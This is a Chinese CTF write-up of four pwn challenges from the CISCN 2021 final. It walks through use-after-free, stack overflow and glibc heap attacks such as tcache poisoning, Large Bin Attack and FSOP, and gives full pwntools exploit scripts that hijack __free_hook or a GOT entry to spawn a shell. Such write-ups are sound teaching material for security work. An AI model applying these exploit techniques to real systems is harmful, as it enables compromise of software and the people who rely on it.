> 原文链接: https://www.anquanke.com//post/id/248542 


# CISCN 2021 Final Break环节 Pwn Writeup


                                阅读量   
                                **24622**
                            
                        |
                        
                                                                                    



[![](https://p0.ssl.qhimg.com/t01f7854f5c8361e80c.jpg)](https://p0.ssl.qhimg.com/t01f7854f5c8361e80c.jpg)



## cissh

这道题是最简单的一道题目，比赛现场大概有十几支队伍做出来了。

出简单的题目对自己队伍其实蛮不利的，因为如果抽到了自己的题目，比赛过程中会排除自己的题目，而别人都是难题，就很容易爆零。

这是一道 C++ 程序，题目的难度主要在于逆向部分，但是由于比赛现场时间有限，所以这里推荐采用盲测 + 简单静态分析的手法来寻找漏洞。

可以找到程序中存在 Manager::initFuncTable 函数用于初始化

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t013e8a095946ce1320.png)

结合里面的字符串可以猜测到对应的传参与 Linux Shell 类似。

程序中存在 ln 操作可以软链接一个文件，但是源文件删除后 ln 后的内容仍然存在，通过盲测触发了一个 double free 报错

[![](https://p5.ssl.qhimg.com/t0122f12abf8d84b2b8.png)](https://p5.ssl.qhimg.com/t0122f12abf8d84b2b8.png)

这意味着文件“b”还在使用文件“a”的数据指针，存在 UAF，我们可以通过

```
touch a
vi a
ln b a
rm a
vi b #uaf
```

这样来构造出一个 UAF

有了 UAF 之后就直接填满 Tcache 后利用 unsortedbin 泄露出 libc_base，再修改 tcache 的 next 指针为**free_hook，两次申请后得到**free_hook，劫持__free_hook 为 system，再 free(‘/bin/sh\’); 来执行 system(‘/bin/sh’); 即可。

**Exp 脚本**

```
from pwn import *

elf = None
libc = None
file_name = "./cissh"
#context.timeout = 1


def get_file(dic=""):
    context.binary = dic + file_name
    return context.binary


def get_libc(dic=""):
    libc = None
    try:
        data = os.popen("ldd `{``}`".format(dic + file_name)).read()
        for i in data.split('\n'):
            libc_info = i.split("=&gt;")
            if len(libc_info) == 2:
                if "libc" in libc_info[0]:
                    libc_path = libc_info[1].split(' (')
                    if len(libc_path) == 2:
                        libc = ELF(libc_path[0].replace(' ', ''), checksec=False)
                        return libc
    except:
        pass
    if context.arch == 'amd64':
        libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
    elif context.arch == 'i386':
        try:
            libc = ELF("/lib/i386-linux-gnu/libc.so.6", checksec=False)
        except:
            libc = ELF("/lib32/libc.so.6", checksec=False)
    return libc


def get_sh(Use_other_libc=False, Use_ssh=False):
    global libc
    if args['REMOTE']:
        if Use_other_libc:
            libc = ELF("./libc.so.6", checksec=False)
        if Use_ssh:
            s = ssh(sys.argv[3], sys.argv[1], sys.argv[2], sys.argv[4])
            return s.process(file_name)
        else:
            return remote(sys.argv[1], sys.argv[2])
    else:
        return process(file_name)


def get_address(sh, libc=False, info=None, start_string=None, address_len=None, end_string=None, offset=None,
                int_mode=False):
    if start_string != None:
        sh.recvuntil(start_string)
    if libc == True:
        return_address = u64(sh.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
    elif int_mode:
        return_address = int(sh.recvuntil(end_string, drop=True), 16)
    elif address_len != None:
        return_address = u64(sh.recv()[:address_len].ljust(8, '\x00'))
    elif context.arch == 'amd64':
        return_address = u64(sh.recvuntil(end_string, drop=True).ljust(8, '\x00'))
    else:
        return_address = u32(sh.recvuntil(end_string, drop=True).ljust(4, '\x00'))
    if offset != None:
        return_address = return_address + offset
    if info != None:
        log.success(info + str(hex(return_address)))
    return return_address


def get_flag(sh):
    sh.recvrepeat(0.1)
    sh.sendline('cat flag')
    return sh.recvrepeat(0.3)


def get_gdb(sh, gdbscript=None, addr=0, stop=False):
    if args['REMOTE']:
        return
    if gdbscript is not None:
        gdb.attach(sh, gdbscript=gdbscript)
    elif addr is not None:
        text_base = int(os.popen("pmap `{``}`| awk '`{``{`print $1`}``}`'".format(sh.pid)).readlines()[1], 16)
        log.success("breakpoint_addr --&gt; " + hex(text_base + addr))
        gdb.attach(sh, 'b *`{``}`'.format(hex(text_base + addr)))
    else:
        gdb.attach(sh)
    if stop:
        raw_input()


def Attack(target=None, sh=None, elf=None, libc=None):
    if sh is None:
        from Class.Target import Target
        assert target is not None
        assert isinstance(target, Target)
        sh = target.sh
        elf = target.elf
        libc = target.libc
    assert isinstance(elf, ELF)
    assert isinstance(libc, ELF)
    try_count = 0
    while try_count &lt; 3:
        try_count += 1
        try:
            pwn(sh, elf, libc)
            break
        except KeyboardInterrupt:
            break
        except EOFError:
            if target is not None:
                sh = target.get_sh()
                target.sh = sh
                if target.connect_fail:
                    return 'ERROR : Can not connect to target server!'
            else:
                sh = get_sh()
    flag = get_flag(sh)
    return flag


def touch(name):
    sh.sendlineafter("\x1B[31m$ \x1B[m", "touch " + name)


def vi(name, content):
    sh.sendlineafter("\x1B[31m$ \x1B[m", "vi " + name)
    sh.sendline(content)


def cat(name):
    sh.sendlineafter("\x1B[31m$ \x1B[m", "cat " + name)


def ln(name1, name2):
    sh.sendlineafter("\x1B[31m$ \x1B[m", "ln " + name1 + " " + name2)


def rm(name):
    sh.sendlineafter("\x1B[31m$ \x1B[m", "rm " + name)


def pwn(sh, elf, libc):
    context.log_level = "debug"
    for i in range(8):
        name = 'a' + str(i)
        touch(name)
        vi(name, str(i) * 0x100)
    ln('b', 'a7')
    ln('c', 'a6')
    for i in range(8):
        name = 'a' + str(i)
        rm(name)
    cat('b')
    libc_base = get_address(sh, True, info="libc_base:\t", offset=-(96 + 0x10 + libc.sym['__malloc_hook']))
    free_hook_addr = libc_base + libc.sym['__free_hook']
    system_addr = libc_base + libc.sym['system']
    vi('c', p64(free_hook_addr))

    touch('d')
    vi('d', '/bin/sh\x00' * (0x100 // 8))
    touch('e')
    vi('e', p64(system_addr) * (0x100 // 8))
    rm('d')
    #gdb.attach(sh)
    sh.interactive()


if __name__ == "__main__":
    sh = get_sh()
    flag = Attack(sh=sh, elf=get_file(), libc=get_libc())
    sh.close()
    log.success('The flag is ' + re.search(r'flag`{`.+`}`', flag).group())
```

感谢北邮的师傅带来这道签到题~



## Message_Board

题目实现了一个 httpd 服务器，与常规的 Web 服务器不同的是，这道题输入数据的入口是 stdin，所以对于调试来说方便了许多。

由于代码比较复杂，所以找到漏洞比较难，我这里提及一下我本来认为可能会存在的漏洞（目录穿越）

目录穿越漏洞是在 Web 服务器题目中经常会出现的漏洞，如果遇到这种类似的题目一定需要注意

比如这次比赛 AWD 环节中的 **pwn-hmos** 这题就可以利用 **/setconfig.cgi** 功能进行目录穿越，穿越到根目录读取到 flag.txt 文件

[![](https://p3.ssl.qhimg.com/t0105ca38380cbf0693.png)](https://p3.ssl.qhimg.com/t0105ca38380cbf0693.png)

还有纵横杯的 baby_httpd 这题可以用 **%66lag** 来绕过 flag 关键字检测

而在这道题中，对于路径穿越做了严格的检测，所以不存在这类的漏洞（有师傅知道怎么绕过的可以说说~）

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t016f22199634eac756.png)

这道题的漏洞在于

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t015765a3b19139ba50.png)

这部分在读取 Content-Length 的时候，如果 Cookie 中的 Message 结尾不是 |，会对 Content_Len – 1，并且这个操作是在对 size 检测之后进行的，所以我们构造合适的 Content-Length，就可以让 Content_Len 变成 0xFFFFFFFF，使得这里存在一个栈溢出。

但是这个栈溢出和平常的栈溢出不同，因为 fread 函数相当于对每个对象调用 size 次 fgetc 函数，所以一定要求输入长度和 size 一致才可以返回，不过我这里由于 size 长度很长，所以不可能输入长度和 size 一致，这里有两种方法来终止程序读取。

1.读入非常长的内容，直到 fgetc 传入的指针是错误的（超出栈空间，发生异常），这时候 fread 函数就会直接返回。

2.使用 sh.shutdown_raw(‘send’)来关闭输入管道，fread 函数就会返回，这个操作可见 **VNCTF2021-WriteGiveFlag** 这题的做法。

这里暂时没有发现什么比较方便的 getshell 方法，主要是因为程序中的输出输入等函数都依赖于传入 FILE 指针，例如 fputs 这样的函数，难以泄露出内容，也难以读入内容，而栈溢出读入的目标是栈上，但是我们不知道栈的位置。由于无法泄露出内容，所以没有 stdout 的位置，没有这个位置也无法泄露出内容。这里也因为难以在数据包中存在\x00 内容，所以很难利用下面这部分内容将 ret2dlresolve 的数据写到 bss 段上。

[![](https://p5.ssl.qhimg.com/t014b1006ef272336ac.png)](https://p5.ssl.qhimg.com/t014b1006ef272336ac.png)

本来想利用这一段内容把 ret2dlresolve 伪造的数据写到 bss 段上（http_data），但是由于\x00 内容会截断文本，导致后续判断出错。

所以在比赛过程中，为了快速的拿到 flag，我这里认为最好的方法还是

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01a03ac4d1bf088be3.png)

利用这里的 read_file_data 函数，通过传参 path 指针（数据放在 bss 段上），从而来得到 flag 信息。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t012ededf6ea94b33eb.png)

这道题的利用脚本虽然很短，大部分的时间都在考虑如何利用这里的栈溢出和调试上。

**Exp 脚本**

```
from pwn import *
elf = ELF('./httpd')
sh = process('./httpd')

context.log_level = "debug"
#gdb.attach(sh, "b *0x08049501")
#gdb.attach(sh, "b *0x08048A43")
flag_name = 'flag.txt'
payload = '''POST /submit HTTP/1.1
Content-Length: 0
Cookie: Username=wjh;Messages=%s

''' % flag_name
payload = payload.replace('\n', '\r\n')
sh.send(payload)
gadget_addr = 0x08049302
http_data_addr = 0x0804C180
rbp_offset = 0x42c
payload2 = 'a' * (0x82E - len(flag_name) - 1) + p32(http_data_addr + 0x1e + rbp_offset) + p32(gadget_addr) + p32(elf.plt['exit'])
payload2 = payload2.ljust(0x5000, '\x00')
sh.send(payload2)
#sh.shutdown_raw('send')
sh.interactive()
```



## allocator

从这题开始的难度就飙升了，这道题的漏洞点也非常值得大家学习~

这道题的大概思路可以学习一下 [津门 AWD hpad](https://www.anquanke.com/post/id/243013) 这道题

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t018e579de9bf972e40.png)

程序使用 C++ 编写，稍微加入了一些加密操作用于考察逆向能力。

[![](https://p2.ssl.qhimg.com/t01af6eed4cac338ce8.png)](https://p2.ssl.qhimg.com/t01af6eed4cac338ce8.png)

题目中使用 mmap 来申请一块空间，并且自行管理，并且在申请堆块的时候没有考虑空间是否会满，存在通过 read 函数传递的参数可能会是无效内存从而造成异常返回 -1。

在 read_content 函数中由于实现问题就会造成无限的向上溢出（和 hpad 那题漏洞一致）

[![](https://p2.ssl.qhimg.com/t018acfacf0a1257055.png)](https://p2.ssl.qhimg.com/t018acfacf0a1257055.png)

通过这个函数向上溢出覆盖到程序的 free 堆块 链上，这样可以两次申请就得到任意地址任意读写权限。（但是需要注意的是程序实现的堆块会对 size 内容进行验证，要求输入的 size 和 伪造指针的 size 位一致才会取出，否则会继续遍历）

由于程序是使用 glibc2.31，所以这道题直接覆盖某个 got 指针为 one_gadget 这样的方法行不通（glibc2.31 的 one_gadget 要求苛刻），所以这里需要考虑劫持 got[@atoi](https://github.com/atoi) 为 system 函数，在下次传参的时候传入/bin/sh 就可以执行 system(‘/bin/sh’)。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t019dbd7643b9902cae.png)

这里我本来考虑直接劫持链到 got[@atoi](https://github.com/atoi) 上，结果发现程序至少输入一个字节的内容，这样会覆盖到 got 表上的内容，导致后续调用的时候出错。

并且程序限制功能次数为 10 次，所以无法进行两次利用（第一次泄露 libc，第二次修改 atoi）。

**所以这里最后的利用方法是通过劫持保存堆块指针的那块空间，然后修改堆块指针实现任意读写。**

**读 -&gt; got[@atoi](https://github.com/atoi) 用来泄露 libc，写 -&gt; 修改 got[@atoi](https://github.com/atoi) 为 system 来 getshell。**

**Exp 脚本**

```
from pwn import *
from Crypto.Util.number import *

elf = None
libc = None
file_name = "./allocator"
# context.timeout = 1


def get_file(dic=""):
    context.binary = dic + file_name
    return context.binary


def get_libc(dic=""):
    libc = None
    try:
        data = os.popen("ldd `{``}`".format(dic + file_name)).read()
        for i in data.split('\n'):
            libc_info = i.split("=&gt;")
            if len(libc_info) == 2:
                if "libc" in libc_info[0]:
                    libc_path = libc_info[1].split(' (')
                    if len(libc_path) == 2:
                        libc = ELF(libc_path[0].replace(' ', ''), checksec=False)
                        return libc
    except:
        pass
    if context.arch == 'amd64':
        libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
    elif context.arch == 'i386':
        try:
            libc = ELF("/lib/i386-linux-gnu/libc.so.6", checksec=False)
        except:
            libc = ELF("/lib32/libc.so.6", checksec=False)
    return libc


def get_sh(Use_other_libc=False, Use_ssh=False):
    global libc
    if args['REMOTE']:
        if Use_other_libc:
            libc = ELF("./libc.so.6", checksec=False)
        if Use_ssh:
            s = ssh(sys.argv[3], sys.argv[1], sys.argv[2], sys.argv[4])
            return s.process(file_name)
        else:
            return remote(sys.argv[1], sys.argv[2])
    else:
        return process(file_name)


def get_address(sh, libc=False, info=None, start_string=None, address_len=None, end_string=None, offset=None,
                int_mode=False):
    if start_string != None:
        sh.recvuntil(start_string)
    if libc == True:
        return_address = u64(sh.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
    elif int_mode:
        return_address = int(sh.recvuntil(end_string, drop=True), 16)
    elif address_len != None:
        return_address = u64(sh.recv()[:address_len].ljust(8, '\x00'))
    elif context.arch == 'amd64':
        return_address = u64(sh.recvuntil(end_string, drop=True).ljust(8, '\x00'))
    else:
        return_address = u32(sh.recvuntil(end_string, drop=True).ljust(4, '\x00'))
    if offset != None:
        return_address = return_address + offset
    if info != None:
        log.success(info + str(hex(return_address)))
    return return_address


def get_flag(sh):
    sh.recvrepeat(0.1)
    sh.sendline('cat flag')
    return sh.recvrepeat(0.3)


def get_gdb(sh, gdbscript=None, addr=0, stop=False):
    if args['REMOTE']:
        return
    if gdbscript is not None:
        gdb.attach(sh, gdbscript=gdbscript)
    elif addr is not None:
        text_base = int(os.popen("pmap `{``}`| awk '`{``{`print $1`}``}`'".format(sh.pid)).readlines()[1], 16)
        log.success("breakpoint_addr --&gt; " + hex(text_base + addr))
        gdb.attach(sh, 'b *`{``}`'.format(hex(text_base + addr)))
    else:
        gdb.attach(sh)
    if stop:
        raw_input()


def Attack(target=None, sh=None, elf=None, libc=None):
    if sh is None:
        from Class.Target import Target
        assert target is not None
        assert isinstance(target, Target)
        sh = target.sh
        elf = target.elf
        libc = target.libc
    assert isinstance(elf, ELF)
    assert isinstance(libc, ELF)
    try_count = 0
    while try_count &lt; 3:
        try_count += 1
        try:
            pwn(sh, elf, libc)
            break
        except KeyboardInterrupt:
            break
        except EOFError:
            if target is not None:
                sh = target.get_sh()
                target.sh = sh
                if target.connect_fail:
                    return 'ERROR : Can not connect to target server!'
            else:
                sh = get_sh()
    flag = get_flag(sh)
    return flag


def ToString(data):
    ans = 0
    for i in data[::-1]:
        ans = (ans * 2) + (ord(i) - ord('0'))
    print hex(ans)
    print long_to_bytes(ans)


def edit(idx, content):
    sh.sendlineafter("&gt;&gt;", "edit(`{`0`}`);".format(idx))
    sh.sendafter("00101110011101101010011000101110011101101111011011000110", content)

def show(idx):
    sh.sendlineafter("&gt;&gt;", "show(`{`0`}`);".format(idx))


def free(idx):
    sh.sendlineafter("&gt;&gt;", "free(`{`0`}`);".format(idx))


def gain(idx, size, content):
    sh.sendlineafter("&gt;&gt;", "gain(`{`0`}`);".format(idx))
    sh.sendlineafter("10100110010111101001011011001110:", str(size))
    sh.sendafter("00101110011101101010011000101110011101101111011011000110", content)


def pwn(sh, elf, libc):
    context.log_level = "debug"
    ToString("01110110100101101000011011100110")
    ToString("00101110100101100010011010100110")
    ToString("11101110111101100001011011001110")
    ToString("10100110101001100100111001100110")
    ToString("00101110100101100001111010100110")
    ToString("01110110111101101001011000101110110001101010111001001110001011101100111001110110100101100000010000100")
    ToString("110100101100011011010000110011011100111011010010010")
    ToString("00101110011101101010011000101110011101101111011011000110")
    gain(0, 0xF00 - 0x100, 'a' * (0xf00 - 0x100))  # 0
    gain(1, 0xB0, 'a' * 0xB0)  # 1
    free(0)
    free(1)
    #gdb.attach(sh)
    gain(4, 0x1e8, p64(0x4043a0) + 'c' * 0x1df + "\n")  # 4
    gain(5, 0xB0, 'a' * 0xb0)
    gain(6, 0x131410c0,  p64(0x131410e0) + p64(0) + p64(0) + p64(0) + p64(0x4040b8) + "\n")
    show(2)
    libc_base = get_address(sh, True, offset=-0x47730, info="libc_base:\t")
    system_addr = libc_base + 0x55410

    edit(2, p64(system_addr) + p64(0x401186))

    sh.sendlineafter("&gt;&gt;", "gain(/bin/sh);")
    sh.interactive()


if __name__ == "__main__":
    sh = get_sh()
    flag = Attack(sh=sh, elf=get_file(), libc=get_libc())
    sh.close()
    log.success('The flag is ' + re.search(r'flag`{`.+`}`', flag).group())
```



## Binary_Cheater

这道题赛后了解到是 FMYY 出的题目，记得上次做 FMYY 出的 NULL_FXCK 的那题，调了一天，现在都还有些阴影。这次这道题目只调了一下午，也算是有进步了吧~

这道题加了一个 ollvm 控制流平坦化，导致程序代码非常的难看。但是这其实不影响我们看程序的大概逻辑，通过题目给出的 hint 也能大概能知道题目的漏洞点。所以对于这道题我们来重点分析程序的利用方法，而不是如何**反 ollvm 控制流平坦化**，这部分内容如果有需要了解的可以看“看雪无名侠大佬的文章”来学习如何使用 Unicorn 来反混淆，关于 Unicorn 的使用方法也可以先学习[使用 unicorn 来自动化解题](https://www.anquanke.com/post/id/246451)这篇文章。

### <a class="reference-link" name="%E7%A8%8B%E5%BA%8F%E6%BC%8F%E6%B4%9E%E5%92%8C%E9%99%90%E5%88%B6%E6%9D%A1%E4%BB%B6"></a>程序漏洞和限制条件

1.限制了申请 size 只能在 0x410 和 0x450 之间

2.使用 calloc 函数进行申请

3.没有 exit 功能

4.存在 UAF 漏洞，但是通过一个字段标记使得无法进行 double free。

5.开启沙箱

6.禁用 free_hook 和 malloc_hook

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"></a>漏洞利用

以下使用做题者的角度来思考解题的过程，使得阅读过程非常流程自然。

#### <a class="reference-link" name="%E5%A6%82%E4%BD%95%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%B5%81%E7%A8%8B"></a>如何控制程序流程

首先是 calloc 函数和申请 size 只能 UAF 使我想到了 cnitlrt 师傅的[新版本 glibc 下的 IO_FILE 攻击](https://www.anquanke.com/post/id/216290)这篇文章，主要的思想就是通过

[![](https://p4.ssl.qhimg.com/t01fdd9bf01362bd3e6.png)](https://p4.ssl.qhimg.com/t01fdd9bf01362bd3e6.png)

_IO_str_overflow 这个函数中的 malloc、memcpy、free 这三个函数组合来达到控制程序流程的目的（任意位置写）。

我们假设 tcache 的某个 size 对应的链表头部被修改成__free_hook，这时候我们触发 FSOP 来执行这一段代码。

1.通过 malloc 申请得到__free_hook

2.通过 memcpy 复制之前伪造好的数据覆盖到__free_hook 上，（例如复制一个 system 指针）

3.通过 free 来释放堆块，同时触发__free_hook 的函数指针。

如果程序没有开启沙箱，这里直接覆盖__free_hook 为 system，然后再调整一下写入起始位置，使得头部数据为’/bin/sh’，即可执行 system(‘/bin/sh’);

如果程序开启了沙箱，那么就可以通过修改__free_hook 为某个 gadget 来通过 setcontext 执行 SROP 来用 ROP orw。这里需要 gadget 利用是因为 setcontext + 61 从 glibc 2.29 之后变为 rdx 寄存器传参，所以需要控制 rdx 寄存器的内容。这部分的操作如果不熟悉可以看[【PWNHUB 双蛋内部赛】StupidNote Writeup](http://blog.wjhwjhn.com/archives/155/) 这篇文章。

所以在控制流程之前我们至少需要满足以下两个条件

1.让 tcache 某个 size 对应的链表头部被修改为__free_hook

2.触发 FSOP

#### <a class="reference-link" name="%E5%A6%82%E4%BD%95%E4%BC%AA%E9%80%A0%20tcache%20%E9%93%BE%E8%A1%A8%E5%A4%B4%E9%83%A8"></a>如何伪造 tcache 链表头部

这里可以用的方法很多，我这里简单的说说平常可能会用到的方法，然后再根据这道题目限制的条件进行筛选。

1.利用 Tcache Stashing Unlink Attack

利用 Tcache Stashing Unlink 过程中 small bin 放入 tcache 的过程中，伪造 small bin 的内容，并且使用 Large Bin Attack 在伪造指针的 bk 位置写一个可写地址让程序奔溃，结合以上操作可以使得 Tcache 的链表头部变成任意地址。

这部分的内容实际上就是 [house of pig](https://www.anquanke.com/post/id/242640) 这道题目利用的手法，有兴趣的可以前往学习，但是个人认为这个方法不能称作 house of xxx 的手法，并且 cnitlrt 师傅在去年 5 月份就发现了这个利用思路，实在不能称作新的堆利用方法。

这个方法对于这道题来说难以实现，主要是因为这道题限制了申请的 size 为 LargeBin 大小，难以构造出多个 small bin 堆块。

2.利用 Large Bin Attack 攻击 TLS 结构体中的 Tcache 结构体指针

通过 Large Bin Attack 劫持 Tcache 结构体指针，使得 Tcache 结构体内容变为可控内容，从而修改链表头部数据。这里很有可能会出现的问题和 [house of banana](https://www.anquanke.com/post/id/222948) 这个利用方法一样，由于 ld 版本不同，并且通常情况下题目未给出，导致出现需要爆破偏移的情况。这里我问了 FMYY 师傅，给出的解决方法是在本地起一个 Docker 来计算偏移，利用靶机通常都是使用官方镜像这个点来计算得到稳定的偏移值。

3.利用 Large Bin Attack 攻击 mp_.tcache_bins 来造成 Tcache Struct 溢出利用

这个方法可以通过 [glibc 2.27-2.32 版本下 Tcache Struct 的溢出利用](https://www.anquanke.com/post/id/235821) 这篇文章来学习。这个利用方法也是 cnitlrt 师傅先发现的。大概就是让 Tcache Struct 的内容溢出到可控的空间，相当于控制了链表头部。

这里的方法都是基于 Large Bin Attack 来实现的，这个方法可以通过 [Large Bin Attack 学习记录](http://blog.wjhwjhn.com/archives/147/) 这篇文章来学习，由于这道题是 glibc2.32 的，在 glibc2.30 中修复了一个利用位置，所以只需要看 **glibc2.30 的检测**这一部分即可。

##### <a class="reference-link" style="background-image: url('img/anchor.gif');" name="%E5%A6%82%E4%BD%95%E8%A7%A6%E5%8F%91__malloc_assert"></a>如何触发__malloc_assert

这部分主要是来源于源码中任何调用 **assert** 的部分（注意这里不是调用 **malloc_printerr** 的部分）

在 malloc 中有很多可用的点，这个也相对来说比较简单，因为我们平时都想办法绕过这个检测，这时候特意的去触发检测相对来说要简单许多。

**1.sysmalloc 部分**

在这部分中会触发的检测可以参照 **house of force** 会遇到的问题，主要就是如果申请后的 top chunk size 小于 MINSIZE（0x10）或者不足够当次申请时，那么就会触发重新申请来调用 sysmalloc，在 sysmalloc 中会检查是否对齐，如果未对齐就会触发 assert 来报错退出。

[![](https://p2.ssl.qhimg.com/t01f4fdfdfde77a0b71.png)](https://p2.ssl.qhimg.com/t01f4fdfdfde77a0b71.png)

**2._int_malloc 部分**

这一部分利用来自于修改 largebin 上 size 对应的 large bin 的链表头部的 bk 指针，使其指向位置的 size 结构满足以下条件

```
#define chunk_main_arena(p) (((p)-&gt;mchunk_size &amp; NON_MAIN_ARENA) == 0)
```

就可以触发 assert 进入 FSOP 流程

[![](https://p0.ssl.qhimg.com/t011ef81a2bfb90e868.png)](https://p0.ssl.qhimg.com/t011ef81a2bfb90e868.png)

**3.其他位置**

以上介绍的两个位置均是在 House of Kiwi 中所提及的位置，相对来说利用比较简单。在其他地方也存在着许多可利用的位置，可以自行寻找。

#### <a class="reference-link" style="background-image: url('img/anchor.gif');" name="%E4%BF%AE%E6%94%B9%20stderr%20%E6%8C%87%E9%92%88"></a>修改 stderr 指针

这个指针存在于 libc 上，我们只需要通过 Large Bin Attack 来修改就可以劫持到我们的可控堆块上

[![](https://p4.ssl.qhimg.com/t01ddbea0f62317caba.png)](https://p4.ssl.qhimg.com/t01ddbea0f62317caba.png)

在代码中使用的 stderr 都是从这里得到的。

#### <a class="reference-link" style="background-image: url('img/anchor.gif');" name="%E7%BB%86%E8%8A%82%E9%97%AE%E9%A2%98"></a>细节问题

很多师傅在复现过程中可能会遇到的一些问题，我在这里进行提及。

1.在 EXP 脚本中使用的攻击手法是使用攻击 mp_.tcache_bins 来造成 Tcache Struct 溢出利用，其对应的溢出位置是采用**调试 + 计算**的方法结合来找到的，这里给出一个我在过程中用于计算的一个程序。

```
#define csize2tidx(x) (((x) - 0x20 + 0x10 - 1) / 0x10)
#include &lt;cstdio&gt;
int main()
`{`
    for (size_t tbytes = 0; tbytes &lt; 0x10000000; tbytes++)
    `{`
        size_t tc_idx = csize2tidx(tbytes);
        if (tc_idx == 0x158)
        `{`
            printf("0x%x", tbytes);
            break;
        `}`
    `}`
    return 0;
`}`
```

这个程序是我根据我能够写入的 tcache-&gt;counts[tc_idx] 位置中的 tc_idx 来计算出对应调用所需要的 tbytes(size)，利用这个 tbytes 再推出在 IO 上需要构造的地址。我使用了一个爆破的方法非常丑陋，实际上也可以直接逆推。

在这个 glibc 版本中

**tcache-&gt;counts[tc_idx] 的偏移计算是 tcacheStruct + 2 * tc_idx**

**tcache-&gt;entries[tc_idx] 的计算偏移是 tcacheStruct + 2 * 64 + 8 * tc_idx &lt;=&gt; tcacheStruct + 0x80 + 8 * tc_idx &lt;=&gt; tcacheStruct + 8 * (0x10 + tc_idx)。**

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01c338b765d9c80928.png)

图中 rbx 对应的是 tc_idx，rax 对应的是 tcacheStruct

tcacheStruct 是储存 tcache_perthread_struct 结构体的起始位置的指针（\x10 结尾）

由于在之前的版本中 tcache_perthread_struct 结构体内容有所变化，所以我建议还是以调试结果为主。

2.IO 数据的构造

这部分 IO 的构造可以参考 [SWPUCTF2020 corporate_slave _IO_FILE 组合利用](http://blog.wjhwjhn.com/archives/138/) 这篇文章中我所分析的。由于这篇文章写的较早，当时学习的 glibc 版本较低，有些东西可能不再适用于最新版本，希望各位师傅可以尝试着去看源码来分析。

需要注意的是，与 house of pig 那题中的 IO 结构不同的是，这道题中的 IO 结构中的 _lock (+0x88) 要为一个可访问的指针，如果不是的话，在这道题中调用 _IO_flockfile(fp) 时会对_lock 所指向的地址进行访问，导致程序在一个 cmp 指令处报错，这一点在[ AngleBoy (NTU CSIE Cpmputer Security 2018 Fall) Play with FILE Structure – I](https://www.youtube.com/watch?v=_ZnnGZygnzE) （23:14）中也提到过。

3.禁用**free_hook 和**malloc_hook

这道题实际上会检查这两个 hook 函数的数据来防止非预期的，但实际上我们利用 **_IO_str_overflow** 这个函数来控制程序流程使得程序根本没有机会来检测__free_hook，所以就相当于我们绕过了这个检测。

4.修改 top chunk 的 size

这个主要是利用 unsortedbin 堆块与 top chunk 合并后的 UAF 来达成的，就是提前申请一块空间再释放掉使其与 top chunk 合并，之后再申请其中的一部分（小于提前申请的 size），使得新的 top chunk size 能够落在提前申请的空间内，再利用 UAF 就可以修改 top chunk 的 size 了。

这个操作需要注意需要在修改 mp_.tcache_bins 之前完成，因为修改之后再 free 就会直接进入 Tcache 中，而不会认为是 unsortedbin 来进行 unlink。

5.恢复 largebin 信息

在 largebin Attack 后，原来的 largebin 链表被破坏，所以当下次使用的时候就会发生异常导致程序异常退出。所以如果我们需要多次的 largebin Attack，就一定要在攻击之后恢复链表数据，恢复的链表数据可以先把 largebin Attack 需要进行的那行 UAF 修改代码注释掉（不进行 largebin Attack），再调试就可以得到正常情况下的数据。

### <a class="reference-link" name="%E6%80%BB%E7%BB%93"></a>总结

